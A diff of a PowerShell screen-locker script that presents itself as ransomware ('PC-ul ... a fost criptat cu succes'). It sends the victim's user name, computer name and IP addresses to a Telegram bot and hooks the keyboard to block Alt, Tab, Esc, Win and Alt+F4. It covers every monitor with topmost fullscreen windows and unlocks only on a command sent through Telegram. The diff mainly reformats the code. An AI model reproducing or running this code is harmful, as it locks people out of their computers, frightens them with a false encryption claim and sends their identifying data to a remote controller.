@@ -6,10 +6,10 @@ $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
 $unlockCommand = "/unlock$user"
 
-# === DOWNLOAD IMAGE ===
+# DOWNLOAD IMAGE
 Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing
 
-# === SEND TELEGRAM MESSAGE FUNCTION ===
+# SEND TELEGRAM MESSAGE FUNCTION
 function Send-Telegram-Message {
     try {
         $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
@@ -19,14 +19,14 @@ function Send-Telegram-Message {
 
     try { $ipPublic = (Invoke-RestMethod "https://api.ipify.org") } catch { $ipPublic = "n/a" }
 
-    $message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic`n`nUnlock it: $unlockCommand"
+    $message = "PC-ul $user ($pc) a fost criptat cu succes.nIP: $ipLocal | $ipPublicnnUnlock it: $unlockCommand"
     $body = @{ chat_id = $chatID; text = $message } | ConvertTo-Json -Compress
     Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
 }
 
 Send-Telegram-Message
 
-# === KEYBLOCKER CLASS: BLOCK ALT+TAB, WIN, ESC, ALT, AND ALT+F4 ===
+# IMPROVED LOW-LEVEL KEYBOARD HOOK CLASS (Blocks ALT+F4, ALT, Win, Tab, Esc)
 Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -65,14 +65,23 @@ public class KeyBlocker {
     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
         if (nCode >= 0) {
             int vkCode = Marshal.ReadInt32(lParam);
+
             if (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
-                if (vkCode == 0x43) Environment.Exit(0); // Key C to exit
-                if (vkCode == 0x12) altPressed = true;
-                if (altPressed && vkCode == 0x73) return (IntPtr)1; // Alt + F4
-                if (vkCode -in 0x09,0x1B,0x5B,0x5C,0x12) return (IntPtr)1; // Tab, Esc, LWin, RWin, Alt
+                if (vkCode == 0x43) Environment.Exit(0); // C key closes app
+
+                if (vkCode == 0x12) altPressed = true; // ALT pressed
+
+                // Explicitly block Alt+F4
+                if (altPressed && vkCode == 0x73)
+                    return (IntPtr)1;
+
+                // Block Windows keys, ALT, Tab, Esc individually
+                if (vkCode == 0x09 || vkCode == 0x1B || vkCode == 0x5B || vkCode == 0x5C || vkCode == 0x12)
+                    return (IntPtr)1;
             }
+
             if (wParam == (IntPtr)WM_KEYUP || wParam == (IntPtr)WM_SYSKEYUP) {
-                if (vkCode == 0x12) altPressed = false;
+                if (vkCode == 0x12) altPressed = false; // ALT released
             }
         }
         return CallNextHookEx(hookId, nCode, wParam, lParam);
@@ -82,48 +91,44 @@ public class KeyBlocker {
 
 [KeyBlocker]::Block()
 
-# === PREPARE WINFORMS ===
+# FULLSCREEN ON ALL MONITORS
 Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
 $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
     $form = New-Object Windows.Forms.Form -Property @{
         FormBorderStyle = 'None'
-        WindowState     = 'Maximized'
-        StartPosition   = 'Manual'
-        TopMost         = $true
-        Location        = $screen.Bounds.Location
-        Size            = $screen.Bounds.Size
-        Cursor          = [System.Windows.Forms.Cursors]::None
-        BackColor       = 'Black'
-        KeyPreview      = $true
+        WindowState = 'Maximized'
+        StartPosition = 'Manual'
+        TopMost = $true
+        Location = $screen.Bounds.Location
+        Size = $screen.Bounds.Size
+        Cursor = [System.Windows.Forms.Cursors]::None
+        BackColor = 'Black'
     }
 
-    # 🛡 Prevent closing via Alt+F4, Task Manager etc.
-    $form.Add_FormClosing({ $args[1].Cancel = $true })
-    $form.Add_Deactivate({ $form.Activate() })
-
     $pb = New-Object Windows.Forms.PictureBox -Property @{
-        Image    = [System.Drawing.Image]::FromFile($tempImagePath)
-        Dock     = 'Fill'
+        Image = [System.Drawing.Image]::FromFile($tempImagePath)
+        Dock = 'Fill'
         SizeMode = 'StretchImage'
     }
 
+    $form.Add_Deactivate({ $form.Activate() })
     $form.Controls.Add($pb)
     $form.Show()
     $form
 }
 
-# === TELEGRAM LISTENER ===
+# TELEGRAM LISTENER WITH TIMER (Stable offset)
 $offset = 0
 try {
     $initialUpdates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -UseBasicParsing -TimeoutSec 5
     if ($initialUpdates.result.Count -gt 0) {
         $offset = ($initialUpdates.result | Select-Object -Last 1).update_id + 1
     }
-} catch {}
+} catch { }
 
 $timer = New-Object System.Windows.Forms.Timer
-$timer.Interval = 5000
+$timer.Interval = 5000 # check every 5 seconds
 $timer.Add_Tick({
     try {
         $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
@@ -134,13 +139,13 @@ $timer.Add_Tick({
                 [System.Windows.Forms.Application]::Exit()
             }
         }
-    } catch {}
+    } catch { }
 })
 $timer.Start()
 
-# === START UI LOOP ===
+# START APP LOOP
 [System.Windows.Forms.Application]::Run()
 
-# === CLEANUP ===
+# CLEANUP ON EXIT
 $timer.Stop()
 [KeyBlocker]::Unblock()
